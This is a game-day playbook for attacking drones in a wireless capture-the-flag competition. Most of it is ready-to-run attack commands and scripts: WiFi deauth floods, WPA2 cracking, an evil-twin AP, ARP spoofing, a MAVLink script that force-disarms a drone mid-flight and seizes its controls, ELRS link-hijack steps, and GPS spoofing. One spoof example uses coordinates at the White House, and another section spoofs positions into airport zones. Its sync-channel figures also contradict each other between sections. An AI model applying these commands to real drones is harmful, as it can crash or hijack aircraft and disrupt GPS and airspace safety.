# Game-Day Playbook — Wireless Drone CTF

> **Audience:** Attack team operators under time pressure.  
> **Scope:** Authorized CTF competition against target drones/GCS we do not own.  
> **Last updated:** 2026-10-15  

---

## Table of Contents

1. [Pre-Game Setup](#1-pre-game-setup)
2. [Opening Moves — First 60 Seconds](#2-opening-moves--first-60-seconds)
3. [Protocol Decision Tree](#3-protocol-decision-tree)
4. [Attack Playbooks by Protocol](#4-attack-playbooks-by-protocol)
5. [Timing Guide](#5-timing-guide)
6. [Troubleshooting](#6-troubleshooting)
7. [Rules Compliance Checklist](#7-rules-compliance-checklist)

---

## 1. Pre-Game Setup

### 1.1 Equipment Checklist

Pack and verify **the night before**. Check marks mean power-on tested.

#### Radios & Adapters

| Item | Qty | Purpose | Verify |
|---|---|---|---|
| Ettus B210 | 1 | SDR TX/RX — GPS spoof, ELRS capture, SiK analysis | `uhd_find_devices` returns serial |
| Ettus B205mini | 1 | Secondary SDR — simultaneous operations | `uhd_find_devices` returns serial |
| ALFA WiFi adapter(s) | 2+ | Monitor mode, injection, deauth | `airmon-ng` lists adapter |
| EMAX E8 controller | 1 | ELRS TX / attack TX | Powered with battery, serial responds |
| USB-serial adapter(s) | 2 | CRSF probe, MAVLink injection | `ls /dev/ttyUSB*` or `/dev/ttyACM*` |
| USB hub (powered) | 1 | Don't run out of ports | — |

#### Antennas

| Antenna | Use Case |
|---|---|
| 2.4 GHz directional (patch/Yagi) | ELRS capture, WiFi targeted deauth |
| 2.4 GHz omni (SMA) | WiFi scanning, general 2.4 GHz |
| 915/433 MHz whip | SiK telemetry sniff/inject |
| GPS L1 patch (1575.42 MHz) | GPS spoofing TX |
| Dual-band WiFi omni | Broadband recon |

> **Antenna selection rule:** Start omni for recon. Switch directional once you have a target bearing.

#### Compute

| Item | Notes |
|---|---|
| Primary laptop (Ubuntu) | All attack tools pre-installed |
| Backup laptop | Cloned environment, in case of hardware failure |
| Power strips + extension cord | Competition venues are never well-powered |
| Batteries for E8 | At least 2 fully charged |
| Ethernet cable | If organizers provide wired network for scoring |

#### Storage & Data

| Item | Notes |
|---|---|
| USB drive with rainbow tables | `elrs-rainbow-table.csv`, `elrs-rainbow-table.json` (193 phrases) |
| Wordlists | `rockyou.txt`, custom drone/ELRS wordlist |
| Firmware backups | Betaflight hex, ELRS source, target configs |
| This playbook (printed) | Paper doesn't crash |

### 1.2 Software Verification

Run this checklist on the attack laptop before leaving for the venue:

```bash
# Core tools
airmon-ng --help          # Aircrack-ng suite
hcxdumptool --version     # PMKID capture
hashcat --version         # Password cracking
mdk4 --help               # WiFi DoS framework
bettercap --version       # MitM framework
hostapd -v                # Evil twin AP

# SDR
uhd_find_devices          # USRP drivers
gnuradio-companion --version  # GNU Radio
gps-sdr-sim -h            # GPS spoofing

# Protocol tools
python3 -c "import pymavlink; print(pymavlink.__version__)"  # MAVLink
python3 -c "import scapy; print(scapy.__version__)"          # Packet crafting
python3 -c "import serial; print(serial.__version__)"        # Serial/CRSF

# Bluetooth
bluetoothctl --version
hcitool --version

# Repo tools
python3 tools/elrs-uid-rainbow.py --help
python3 tools/elrs-serial-probe.py --help
```

### 1.3 Laptop Configuration

```bash
# Disable NetworkManager on attack WiFi interface
sudo nmcli device set wlan1 managed no

# Enable monitor mode
sudo airmon-ng start wlan1

# Verify injection works
sudo aireplay-ng --test wlan1mon

# Set regulatory domain for full channel access
sudo iw reg set US

# Disable power save on WiFi adapter
sudo iw dev wlan1mon set power_save off
```

---

## 2. Opening Moves — First 60 Seconds

**Goal:** Identify every target's protocol before transmitting anything.

### 2.1 Passive Recon Sequence

Run these simultaneously from separate terminals:

```
Terminal 1 — WiFi scan
Terminal 2 — BLE scan
Terminal 3 — SDR spectrum sweep
Terminal 4 — Note-taking / coordination
```

#### Terminal 1: WiFi (2 seconds to first results)

```bash
# Start capture on all channels, cycling
sudo airodump-ng wlan1mon --band abg --write recon --output-format csv,pcap

# What to look for:
# SSID patterns: TELLO-*, ARDRONE*, DJI-*, Skydio-*, *_FPV, *drone*
# Open auth = direct connect target
# WPA2 = crack-then-connect target
```

#### Terminal 2: BLE (3 seconds to first results)

```bash
# Scan for BLE advertisements
sudo hcitool lescan --duplicates &
sudo btmon &

# What to look for:
# DJI-* prefixed names (CVE-2026-78306 targets)
# ESP32 provisioning services (attack surface)
# Unknown GATT services from drone controllers
```

#### Terminal 3: SDR Spectrum (10 seconds)

```bash
# Quick waterfall view of key bands
# 433 MHz — SiK telemetry, some toy drones
# 915 MHz — SiK telemetry (US), LoRa
# 2.4 GHz — ELRS, WiFi, nRF24, Bluetooth, Crossfire
# 5.8 GHz — FPV video

# Use GNU Radio or uhd_fft for a fast look:
uhd_fft -f 433e6 -s 2e6 -g 40 &   # 433 MHz band
uhd_fft -f 915e6 -s 2e6 -g 40 &   # 915 MHz band
# Note: 2.4 GHz handled by WiFi/BLE tools above
```

### 2.2 First 60 Seconds Decision

After 60 seconds of passive recon, you should know:

| Observation | Protocol | Go to |
|---|---|---|
| Drone SSID in airodump | WiFi | [4.1 WiFi Attacks](#41-wifi-attacks) |
| DJI BLE advertisement | DJI/BLE | [4.5 BLE Attacks](#45-ble-attacks) |
| 915/433 MHz continuous signal | SiK/MAVLink | [4.3 MAVLink Attacks](#43-mavlink-attacks) |
| 2.4 GHz FHSS pattern (not WiFi) | ELRS or Crossfire | [4.2 ELRS Attacks](#42-elrs-attacks) |
| Nothing detected | — | Increase gain, move closer, check antennas |

---

## 3. Protocol Decision Tree

```
                         ┌──────────────┐
                         │  TARGET      │
                         │  DETECTED    │
                         └──────┬───────┘
                                │
                    ┌───────────┼───────────┐
                    ▼           ▼           ▼
              ┌──────────┐ ┌────────┐ ┌──────────┐
              │ WiFi AP  │ │  BLE   │ │ RF only  │
              │ visible  │ │ advert │ │ (SDR)    │
              └────┬─────┘ └───┬────┘ └────┬─────┘
                   │           │           │
          ┌────────┴──┐    ┌───┴───┐   ┌───┴────────┐
          ▼           ▼    ▼       ▼   ▼            ▼
     ┌────────┐  ┌────────┐ ┌─────┐ ┌────┐  ┌──────────┐  ┌──────────┐
     │  Open  │  │  WPA2  │ │ DJI │ │ESP │  │ 433/915  │  │  2.4GHz  │
     │  Auth  │  │  PSK   │ │ BLE │ │ 32 │  │   MHz    │  │   FHSS   │
     └───┬────┘  └───┬────┘ └──┬──┘ └─┬──┘  └────┬─────┘  └────┬─────┘
         │           │         │      │           │             │
         ▼           ▼         ▼      ▼           ▼             ▼
   Direct       Deauth +    BLE    BLE     MAVLink         ELRS UID
   connect      PMKID/      cmd    fuzz    inject          capture
   + send       handshake   inject               or jam     or jam
   commands     crack

   >>> WiFi    >>> WiFi    >>> BLE   >>> BLE   >>> MAVLink  >>> ELRS
   §4.1        §4.1        §4.5      §4.5      §4.3         §4.2
```

### Protocol Identification Cheat Sheet

| What You See | What It Is | Confidence |
|---|---|---|
| SSID: `TELLO-*` | Tello drone, open WiFi, UDP:8889 SDK | Certain |
| SSID: `ARDRONE*` | AR.Drone, open WiFi | Certain |
| SSID: `DJI-*` (WiFi) | DJI Enhanced WiFi | High |
| BLE name: `DJI-*` | DJI drone BLE interface | Certain |
| BLE: ESP32 provisioning | ESP-based controller/drone | High |
| 915 MHz continuous FSK | SiK telemetry radio (MAVLink) | High |
| 2.4 GHz fast hopping, 80ch | ExpressLRS 2.4 GHz | High |
| 2.4 GHz hopping, not WiFi | Crossfire, ELRS, or FrSky | Medium |
| 5.8 GHz analog signal | FPV video (not attackable for points) | Certain |

---

## 4. Attack Playbooks by Protocol

### 4.1 WiFi Attacks

#### 4.1.1 Open WiFi — Direct Connect (Tello, AR.Drone)

**Time to attack: 10 seconds. No cracking needed.**

```bash
# 1. Connect to drone's open AP
sudo nmcli device wifi connect "TELLO-XXXXXX" ifname wlan0

# 2. Verify connectivity
ping 192.168.10.1

# 3. Send Tello SDK commands (UDP port 8889)
# Enter SDK mode:
echo "command" | nc -u -w1 192.168.10.1 8889

# Land the drone (DoS):
echo "land" | nc -u -w1 192.168.10.1 8889

# Take control:
echo "takeoff" | nc -u -w1 192.168.10.1 8889
echo "forward 50" | nc -u -w1 192.168.10.1 8889

# Emergency stop:
echo "emergency" | nc -u -w1 192.168.10.1 8889
```

**Expected output:** Tello responds `ok` to valid commands.

#### 4.1.2 Deauth Flood (Any WiFi drone — instant DoS)

**Time to attack: 5 seconds after BSSID known.**

```bash
# Targeted deauth against specific drone AP
sudo aireplay-ng -0 0 -a <DRONE_BSSID> wlan1mon

# OR use mdk4 for broader deauth
sudo mdk4 wlan1mon d -B <DRONE_BSSID>
```

**Expected result:** Drone loses contact with controller, enters failsafe (usually hover-then-land or RTH).

#### 4.1.3 PMKID Capture + Crack (WPA2 drones)

**Time to attack: 2-15 minutes depending on password complexity.**

```bash
# 1. Capture PMKID (no client needed!)
sudo hcxdumptool -i wlan1mon -o capture.pcapng --filterlist_ap=targets.txt --filtermode=2

# 2. Convert for hashcat
hcxpcapngtool -o hash.22000 capture.pcapng

# 3. Crack with hashcat
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt
# Try drone-specific wordlist first for speed:
hashcat -m 22000 hash.22000 wordlists/drone-passwords.txt

# 4. Connect with recovered password
sudo nmcli device wifi connect "<DRONE_SSID>" password "<CRACKED_PSK>" ifname wlan0
```

#### 4.1.4 Handshake Capture + Crack (fallback if PMKID fails)

```bash
# 1. Monitor target AP
sudo airodump-ng -c <CHANNEL> --bssid <DRONE_BSSID> -w handshake wlan1mon

# 2. Force handshake with targeted deauth (in another terminal)
sudo aireplay-ng -0 5 -a <DRONE_BSSID> wlan1mon

# 3. Wait for "WPA handshake: XX:XX:XX:XX:XX:XX" in airodump-ng

# 4. Crack
hashcat -m 22000 handshake-01.hc22000 /usr/share/wordlists/rockyou.txt
```

#### 4.1.5 Evil Twin (capture controller reconnection)

```bash
# 1. Clone the drone's AP
# Create hostapd-mana config:
cat > evil-twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=TELLO-XXXXXX
hw_mode=g
channel=6
auth_algs=1
EOF

# 2. Start evil twin
sudo hostapd-mana evil-twin.conf &

# 3. Deauth clients from real AP
sudo aireplay-ng -0 0 -a <REAL_BSSID> wlan1mon

# 4. Controller reconnects to your AP
# Now you're MitM — intercept and inject
```

#### 4.1.6 Network Exploitation (after WiFi access)

```bash
# Scan the drone's network for GCS and other devices
nmap -sn 192.168.10.0/24
nmap -sV -p- 192.168.10.1

# Look for flags:
# - Open FTP/HTTP on GCS
# - MAVLink forwarding ports (14550, 14551)
# - Telnet/SSH with default creds
# - File shares

# ARP spoof to intercept GCS ↔ drone traffic
sudo bettercap -iface wlan0
> net.probe on
> set arp.spoof.targets 192.168.10.1
> arp.spoof on
> net.sniff on
```

---

### 4.2 ELRS Attacks

#### 4.2.1 Betaflight 4.4.2 / OTA v3 SYNC identity fields

The owned TinyHawk runs Betaflight 4.4.2 with ELRS OTA v3. Its pinned source
and the decoded passive captures agree on the following target-specific facts:

- the v3 sync/initial channel is index 41 (nominally about 2441.4 MHz), not
  the v4 channel 40;
- decoded eight-byte OTA frame offsets 4, 5, and 6 are `UID3`, `UID4`, and
  `UID5` (offsets 3, 4, and 5 within the six-byte SYNC payload);
- `UID3` and `UID4`, plus the upper two bits of `UID5`, are unmasked;
- when model match is enabled, only the lower six bits of the transmitted
  `UID5` field are XORed with the inverse model ID; and
- this pair's read-only configuration reports model ID 255, so that XOR is
  zero and the three transmitted fields equal UID bytes 3--5.

Betaflight validates CRC14 before processing those identity fields. The v3
initializer is `((UID[4] << 8) | UID[5]) ^ 3`, so a generic raw `UID5` field
must not be called the full UID byte until model-match state or sufficient
independent CRC evidence resolves its lower six bits. The project's passive
result is stronger than a
field-layout inference: 16 decoded SYNC frames agreed on the suffix, and that
suffix independently validated 38 decoded RC frames.

For a wordlist lookup, use only the recovered, unmasked bytes:

```bash
python3 tools/elrs-uid-rainbow.py --ota-version 3 --lookup <UID3>:<UID4>:<UID5>
```

OTA v4 is the format that removes `UID3` from SYNC. The earlier statement that
v3 removed UID bytes and therefore required jamming was incorrect.

#### 4.2.2 Version-matched ELRS link testing (full air-link UID known)

Once you have the full UID:

```bash
# 1. Compute FHSS hopping sequence from UID
#    Betaflight 4.4.2 builds 240 entries: three 80-channel blocks

# 2. Compute CRC initializer from UID
#    CRC14 poly: 0x2E57 | CRC16 poly: 0x3D65

# 3. Craft valid OTA packets following the hop sequence
#    With correct CRC, the RX accepts your packets as legitimate

# 4. Override the real TX by transmitting with higher power
#    ELRS uses "last valid packet wins" — no TX authentication
```

> **Note:** This attack requires `elrs-analyzer.py` (not yet built) or manual GNU Radio work with the B210.

#### 4.2.3 ELRS Jamming (availability fallback or quick DoS)

**Time to attack: 5 seconds.**

```bash
# Wideband jam on 2.4 GHz ISM
# WARNING: Check CTF rules — RF jamming may be prohibited

# Targeted: use the version-matched sync channel
# Betaflight 4.4.2 OTA v3: channel 41, nominally about 2441.4 MHz
# OTA v4: channel 40
# This disrupts the SYNC mechanism — drone enters failsafe

# Using B210 with GNU Radio:
# Generate wideband noise on 2440 MHz, ~10 MHz bandwidth
# Even a few dBm above noise floor disrupts SX1280 reception
```

#### 4.2.4 ELRS TX WiFi Backdoor

**Time to attack: 30 seconds (if TX is in WiFi mode).**

```bash
# ELRS TXes (like EMAX E8) expose a WiFi AP for firmware updates
# If TX enters WiFi mode:

# 1. Connect to the ELRS TX WiFi AP
sudo nmcli device wifi connect "ExpressLRS TX" ifname wlan0

# 2. Access web UI (default: http://10.0.0.1)
curl http://10.0.0.1

# 3. Upload modified firmware or change binding phrase
# This gives you control of the TX → control of the drone
```

---

### 4.3 MAVLink Attacks

#### 4.3.1 MAVLink Recon (identify unsigned links)

```bash
# Listen for MAVLink on common ports
python3 -c "
from pymavlink import mavutil
conn = mavutil.mavlink_connection('udp:0.0.0.0:14550')
while True:
    msg = conn.recv_match(blocking=True, timeout=5)
    if msg:
        print(f'SysID: {msg.get_srcSystem()} CompID: {msg.get_srcComponent()} Type: {msg.get_type()}')
        if msg.get_type() == 'HEARTBEAT':
            print(f'  Autopilot: {msg.autopilot} Type: {msg.type}')
"
```

#### 4.3.2 MAVLink Command Injection (unsigned — immediate)

**Time to attack: 5 seconds after MAVLink stream found.**

```bash
python3 << 'PYEOF'
from pymavlink import mavutil
import time

# Connect to target (adjust IP/port for your scenario)
conn = mavutil.mavlink_connection('udp:TARGET_IP:14550')
conn.wait_heartbeat()
print(f"Connected to system {conn.target_system}")

# DISARM — motors stop immediately, drone falls
conn.mav.command_long_send(
    conn.target_system, conn.target_component,
    400,  # MAV_CMD_COMPONENT_ARM_DISARM
    0,    # confirmation
    0,    # param1: 0=disarm
    21196, # param2: force disarm magic number
    0, 0, 0, 0, 0
)
print("DISARM sent")

# LAND — controlled descent
conn.mav.command_long_send(
    conn.target_system, conn.target_component,
    21,   # MAV_CMD_NAV_LAND
    0, 0, 0, 0, 0, 0, 0, 0
)
print("LAND sent")

# RC OVERRIDE — take manual control
# Channels: roll, pitch, throttle, yaw (1000-2000 us)
while True:
    conn.mav.rc_channels_override_send(
        conn.target_system, conn.target_component,
        1500, 1500, 1200, 1500,  # gentle descent
        0, 0, 0, 0
    )
    time.sleep(0.02)  # 50Hz update rate
PYEOF
```

#### 4.3.3 PX4 Shell (CVE-2026-1579)

**CVSS 9.8 — arbitrary shell on flight controller via unsigned MAVLink.**

```bash
# If target runs PX4 with unsigned MAVLink (the default):
# Full shell access to the flight controller
# 
# This is the single highest-impact attack in the playbook if PX4 is in use.
# 
# See: CISA ICSA-26-090-02
# Implementation: requires px4-shell.py (not yet built)
# Concept: MAVLink serial passthrough → NuttX shell → full system access
```

#### 4.3.4 MAVLink over SiK Radio (433/915 MHz)

```bash
# 1. Identify SiK signal on 433 or 915 MHz band with B210
# SiK uses FHSS with a NetID — sniff the pattern to extract NetID

# 2. Configure an attack SiK radio to the same NetID
# OR inject directly with B210 using SiK demodulation

# 3. MAVLink packets flow unencrypted over the SiK link
# Inject commands as in §4.3.2
```

#### 4.3.5 MAVLink FTP — Flag Capture

```bash
python3 << 'PYEOF'
from pymavlink import mavutil

conn = mavutil.mavlink_connection('udp:TARGET_IP:14550')
conn.wait_heartbeat()

# List files on the flight controller / GCS
conn.mav.file_transfer_protocol_send(
    conn.target_system, conn.target_component,
    0,  # network
    bytearray([0] * 251)  # payload — build FTP list request
)

# Look for flag files in:
# /fs/microsd/  (flight controller SD card)
# Logs directory
# Mission files
# GCS working directory
PYEOF
```

---

### 4.4 GPS Spoofing

#### 4.4.1 Static Position Spoof

**Time to setup: 2-5 minutes.**

```bash
# 1. Generate GPS signal for a target location
gps-sdr-sim -e brdc3540.14n -l 38.8977,-77.0365,100 -o gpssim.bin -d 300

# 2. Transmit via B210
# WARNING: GPS spoofing may be regulated. Check CTF rules first.
gps-sdr-sim -e brdc3540.14n -l 38.8977,-77.0365,100 -U -d 300
# -U flag: output to USRP directly
# Adjust gain carefully — GPS signals are very weak (-130 dBm)
```

#### 4.4.2 RTH Redirect (combine with another attack)

```bash
# Strategy:
# 1. Spoof GPS to a position YOU control
# 2. Trigger failsafe via deauth/jam (drone tries to RTH)
# 3. Drone flies to YOUR spoofed "home" location

# Step 1: Start GPS spoof broadcasting fake home position
gps-sdr-sim -e brdc3540.14n -l <YOUR_LAT>,<YOUR_LON>,50 -U -d 600

# Step 2: Wait for GPS lock (30-60 seconds for cold fix)

# Step 3: Trigger failsafe on the control link
sudo aireplay-ng -0 0 -a <DRONE_BSSID> wlan1mon
# OR jam ELRS sync channel
```

#### 4.4.3 Geofence Trigger

```bash
# Spoof the drone's position into a no-fly zone (airport, restricted area)
# Many flight controllers auto-land or refuse to arm in restricted zones

# Find nearby restricted coordinates and spoof to them
gps-sdr-sim -e brdc3540.14n -l <AIRPORT_LAT>,<AIRPORT_LON>,50 -U -d 300
```

---

### 4.5 BLE Attacks

#### 4.5.1 DJI BLE Command Injection (CVE-2026-78306)

**Affects 16 DJI models. No authentication required. BLE range only.**

```bash
# 1. Scan for DJI BLE advertisements
sudo hcitool lescan | grep -i DJI

# 2. Connect without trusted UUID (CVE-2026-78306 bypass)
# 3. Send commands:
#    - Change WiFi password → lock out controller
#    - Disable WiFi → isolate the drone
#    - Power off → immediate DoS

# Implementation: requires dji-ble-attack.py (not yet built)
# Reference: research/drone-wireless-vuln-reference.md §2 BLE
```

#### 4.5.2 DJI BLE Credential Sniff (CVE-2026-77812)

```bash
# Passive attack — no connection needed
# DJI drones leak WiFi credentials over BLE in cleartext

# 1. Start BLE passive capture
sudo btmon > ble-capture.log &

# 2. Filter for DJI credential advertisements
# Look for WiFi SSID and password in GATT characteristics

# 3. Use recovered WiFi creds to connect to drone's WiFi
# Then proceed to §4.1.6 for network exploitation
```

#### 4.5.3 ESP32 BLE Exploits

```bash
# BrakTooth (CVE-2021-28139) — RCE on ESP32 Bluetooth Classic
# If target drone/controller uses ESP32 with BT Classic:
# PoC toolkit available on GitHub (braktooth_esp32_bluetooth_classic_attacks)

# ESP32 protocomm overflow (CVE-2026-45542) — RCE via BLE provisioning
# Heap overflow in provisioning service
# Implementation: requires esp32-ble-fuzz.py (not yet built)
```

---

### 4.6 Combo Attacks (Layered)

#### 4.6.1 WiFi Deauth + GPS Spoof (maximum disruption)

```bash
# Terminal 1: Continuous GPS spoof to attacker-controlled position
gps-sdr-sim -e brdc3540.14n -l <ATTACKER_LAT>,<ATTACKER_LON>,50 -U -d 600

# Terminal 2: Deauth flood on drone WiFi
sudo aireplay-ng -0 0 -a <DRONE_BSSID> wlan1mon

# Result: Control link down + GPS says "home" is your location
# Drone RTH flies to you
```

#### 4.6.2 BLE Credential Sniff → WiFi Takeover (DJI chain)

```bash
# 1. Passive BLE sniff → recover WiFi password (CVE-2026-77812)
# 2. Connect to drone WiFi with recovered creds
# 3. MitM or direct command injection via WiFi
# 4. Capture flags from GCS over the network
```

#### 4.6.3 ELRS UID Recovery → Link Hijack + GPS Spoof

```bash
# 1. Decode a version-matched SYNC and resolve any UID5 model-match mask
# 2. Rainbow table lookup → get binding phrase
# 3. Compute full FHSS sequence + CRC seed
# 4. Inject crafted packets to override legitimate TX
# 5. Simultaneously GPS spoof to mask position changes
# Total takeover of the aircraft
```

---

## 5. Timing Guide

### What You Can Do in 60 Seconds

| Action | Time | Notes |
|---|---|---|
| WiFi scan + identify drone APs | 5s | `airodump-ng` first results |
| BLE scan + identify DJI/ESP32 | 5s | `hcitool lescan` |
| Deauth flood (WiFi DoS) | 5s | Immediate effect on WiFi drones |
| Open WiFi connect + Tello land | 10s | Fastest takeover in the book |
| ELRS sync channel jam start | 10s | If RF jamming is allowed |
| MAVLink DISARM (if port known) | 5s | Fastest MAVLink kill |

### What You Can Do in 5 Minutes

| Action | Time | Notes |
|---|---|---|
| PMKID capture attempt | 30s-2min | Depends on whether AP supports it |
| ELRS SYNC capture + rainbow table lookup | 1-3min | Depends on SYNC rate |
| DJI BLE credential sniff + WiFi connect | 2-3min | Passive first stage |
| MAVLink recon + command injection | 1-2min | Network recon + inject |
| GPS spoof signal generation | 2-3min | `gps-sdr-sim` compile + transmit |
| Evil twin AP setup | 3-5min | Config + deauth + wait for reconnect |

### What You Can Do in 15 Minutes

| Action | Time | Notes |
|---|---|---|
| WPA2 handshake crack (weak password) | 5-15min | GPU-dependent |
| ELRS full UID brute-force | 5-10min | 128 candidates for v1.x/v2.x |
| SiK radio NetID extraction + MAVLink inject | 10-15min | B210 signal analysis |
| Full network exploitation + flag hunt | 10-15min | After WiFi access gained |
| GPS RTH redirect (GPS lock time) | 5-10min | 30-60s GPS lock + setup |
| ESP32 BLE exploitation chain | 10-15min | If target is vulnerable |

### Priority Order (maximize points per minute)

```
MINUTE 0-1:   Passive recon (all protocols)
MINUTE 1-2:   Launch fastest available DoS (deauth / ELRS jam / MAVLink DISARM)
MINUTE 2-5:   Start takeover attempts on identified targets
MINUTE 5-10:  Crack passwords, brute-force UIDs, set up GPS spoof
MINUTE 10-15: Network exploitation, flag capture, combo attacks
MINUTE 15+:   Advanced attacks, second-pass on resistant targets
```

---

## 6. Troubleshooting

### 6.1 WiFi Issues

| Problem | Fix |
|---|---|
| `airmon-ng` doesn't list adapter | Unplug/replug USB. Check `dmesg` for driver errors. Try different USB port. |
| Injection test fails | Wrong adapter (not all support injection). Use ALFA AWUS036ACH/ACM. |
| Deauth has no effect | Target may use MFP (802.11w). Try `mdk4` with `-w` flag. |
| PMKID capture times out | AP doesn't support PMKID. Fall back to handshake capture. |
| Hashcat won't start | Check GPU drivers: `nvidia-smi`. CPU fallback: `hashcat --force`. |
| Can't connect after cracking | Wrong BSSID. MAC filter active — spoof your MAC: `macchanger -r wlan0`. |

### 6.2 SDR Issues

| Problem | Fix |
|---|---|
| `uhd_find_devices` returns nothing | Check USB3 cable (USB2 is too slow for B210). Try different port. `sudo uhd_find_devices`. |
| B210 USB errors / dropouts | Use shorter USB cable. Avoid USB hubs. Check `dmesg` for errors. |
| GPS spoof signal not acquired | Increase TX gain (carefully — start at 40, increase by 5). Check antenna connection. |
| GNU Radio flowgraph crashes | Reduce sample rate. Check buffer sizes. |

### 6.3 ELRS Issues

| Problem | Fix |
|---|---|
| No SYNC packets captured | Confirm the RF domain and OTA version. For this Betaflight 4.4.2 v3 pair, check channel 41 (nominally about 2441.4 MHz); v4 uses channel 40. |
| Rainbow table no match | Binding phrase is custom / not in wordlist. Fall back to brute-force or jam. |
| E8 serial probe no response | **Battery must be installed and power switch ON.** USB alone only charges. |

### 6.4 MAVLink Issues

| Problem | Fix |
|---|---|
| No heartbeat received | Wrong port. Try 14550, 14551, 5760. Scan: `nmap -sU -p 14550-14560 TARGET`. |
| Commands rejected | MAVLink signing may be enabled. Try replay attack or dictionary on signing key. |
| RC override has no effect | Some autopilots ignore RC override in certain flight modes. Try DISARM first. |

### 6.5 BLE Issues

| Problem | Fix |
|---|---|
| `hcitool lescan` permission denied | Must run as root: `sudo hcitool lescan`. |
| Can't connect to DJI device | Out of BLE range (~10m). Move closer. |
| BrakTooth PoC fails | ESP32 must have Bluetooth Classic enabled (not just BLE). |

### 6.6 General

| Problem | Fix |
|---|---|
| Laptop overheating | Kill unnecessary processes. Reduce SDR sample rates. Point a fan at it. |
| Too many USB devices | Use powered USB hub. Prioritize: WiFi adapter > SDR > serial. |
| Lost track of targets | Check `airodump-ng` CSV output. Review scan logs. |
| Tool crashes mid-attack | Restart the specific tool. Data captured so far is on disk. |

---

## 7. Rules Compliance Checklist

### 7.1 Before the Competition

- [ ] Confirm CTF rules document received and read by all team members
- [ ] Confirm RF jamming policy (allowed / restricted / prohibited)
- [ ] Confirm GPS spoofing policy
- [ ] Confirm whether deauth attacks are allowed
- [ ] Confirm physical proximity rules (how close can you get to targets?)
- [ ] Confirm scoring model (DoS vs takeover vs flag capture weights)
- [ ] Confirm flag format and submission method (API? Physical? File?)
- [ ] Confirm target list (drone models, protocols, IP ranges)
- [ ] Confirm time limits and round structure
- [ ] Confirm what equipment is allowed (power limits? Antenna restrictions?)

### 7.2 During the Competition

**Always allowed (standard CTF):**

- [x] Passive RF monitoring and spectrum analysis
- [x] WiFi scanning and enumeration
- [x] BLE scanning and enumeration
- [x] Network scanning (within competition network)
- [x] Software exploitation of target systems
- [x] Password cracking (offline, on your own hardware)
- [x] Protocol analysis and packet crafting

**Check rules first:**

- [ ] Active WiFi deauthentication
- [ ] RF jamming (any band)
- [ ] GPS signal spoofing
- [ ] Transmitting on non-WiFi frequencies
- [ ] Physical access to target equipment
- [ ] Attacking scoring infrastructure
- [ ] Attacking other teams

**Never allowed (regardless of CTF rules):**

- [x] Attacking systems outside the competition scope
- [x] Destroying or physically damaging equipment
- [x] Interfering with emergency communications
- [x] Exfiltrating real personal data
- [x] Retaining access after competition ends

### 7.3 Quick Reference Card

Print this and tape it to your monitor:

```
╔═══════════════════════════════════════════════════════╗
║  GAME DAY QUICK REFERENCE                            ║
╠═══════════════════════════════════════════════════════╣
║                                                       ║
║  FIRST 60s: Scan WiFi → Scan BLE → Scan SDR          ║
║  THEN:      Identify protocol → Go to §4.X            ║
║                                                       ║
║  FASTEST DoS:                                         ║
║    WiFi drone → deauth (5s)                           ║
║    MAVLink    → DISARM cmd (5s)                       ║
║    ELRS       → sync channel jam (10s)                ║
║    DJI BLE    → CVE-2026-78306 power off              ║
║                                                       ║
║  FASTEST TAKEOVER:                                    ║
║    Open WiFi  → connect + send commands (10s)         ║
║    MAVLink    → RC_CHANNELS_OVERRIDE (10s)            ║
║    WPA2 WiFi  → PMKID crack → connect (2-15min)      ║
║    ELRS       → UID capture + link hijack (1-5min)    ║
║                                                       ║
║  FLAG CAPTURE:                                        ║
║    Get on network → nmap → look for files/services    ║
║    MAVLink FTP → download from flight controller      ║
║    GCS network → scan for HTTP/FTP/SMB shares         ║
║                                                       ║
║  RULES: Check jamming/GPS/deauth policy FIRST         ║
╚═══════════════════════════════════════════════════════╝
```

---

## Appendix A: Tool Reference

### Repo Tools

| Tool | Location | Command |
|---|---|---|
| ELRS Rainbow Table Generator | `tools/elrs-uid-rainbow.py` | `python3 tools/elrs-uid-rainbow.py --lookup AA:BB:CC` |
| ELRS Serial Probe | `tools/elrs-serial-probe.py` | `python3 tools/elrs-serial-probe.py --dump-params` |
| Pre-computed Rainbow Table | `tools/elrs-rainbow-table.csv` | 193 common binding phrases |
| Pre-computed Rainbow Table (JSON) | `tools/elrs-rainbow-table.json` | Same data, structured format |

### External Tools

| Tool | Install | Use |
|---|---|---|
| aircrack-ng | `sudo apt install aircrack-ng` | WiFi monitor/inject/crack |
| hcxdumptool | `sudo apt install hcxdumptool` | PMKID capture |
| hcxtools | `sudo apt install hcxtools` | Convert captures for hashcat |
| hashcat | `sudo apt install hashcat` | GPU password cracking |
| mdk4 | `sudo apt install mdk4` | WiFi DoS framework |
| bettercap | `sudo apt install bettercap` | MitM / network attacks |
| hostapd-mana | Build from source | Evil twin AP |
| pymavlink | `pip3 install pymavlink` | MAVLink protocol library |
| scapy | `pip3 install scapy` | Packet crafting |
| gps-sdr-sim | Build from source (GitHub) | GPS signal simulation |
| GNU Radio | `sudo apt install gnuradio` | SDR signal processing |
| UHD | `sudo apt install uhd-host` | Ettus USRP drivers |
| nmap | `sudo apt install nmap` | Network scanning |
| Wireshark | `sudo apt install wireshark` | Packet analysis |

### Key Frequencies

| Frequency | Protocol | Notes |
|---|---|---|
| 2400.4–2479.4 MHz | ELRS 2.4 GHz | 80 channels, sync = ch40 (~2440 MHz) |
| 2.4 GHz ISM | WiFi, BLE, Crossfire | Shared band |
| 5.8 GHz | FPV video (analog) | Not useful for scoring |
| 915 MHz | SiK telemetry (US) | MAVLink over FHSS |
| 433 MHz | SiK telemetry (EU) | MAVLink over FHSS |
| 1575.42 MHz | GPS L1 | GPS spoofing target |

---

## Appendix B: Network Cheat Sheet

### Default IPs and Ports

| Drone/System | Default IP | Key Ports |
|---|---|---|
| Tello | 192.168.10.1 | UDP 8889 (command), UDP 11111 (video) |
| AR.Drone | 192.168.1.1 | TCP 23 (telnet), UDP 5556 (nav) |
| MAVLink GCS | varies | UDP 14550, 14551 (MAVLink) |
| PX4 SITL | 127.0.0.1 | UDP 14550, TCP 5760 |
| ELRS TX WiFi | 10.0.0.1 | TCP 80 (web UI) |

### Default Credentials (common drones)

| System | Username | Password |
|---|---|---|
| AR.Drone telnet | (none) | (none) |
| Tello WiFi | — | (open, no password) |
| Generic MAVLink | — | (unsigned by default) |
| DJI WiFi | — | Factory default or blank |

---

*This playbook is for authorized CTF competition use only. All techniques target equipment within the competition scope. Verify rules of engagement before every competition.*
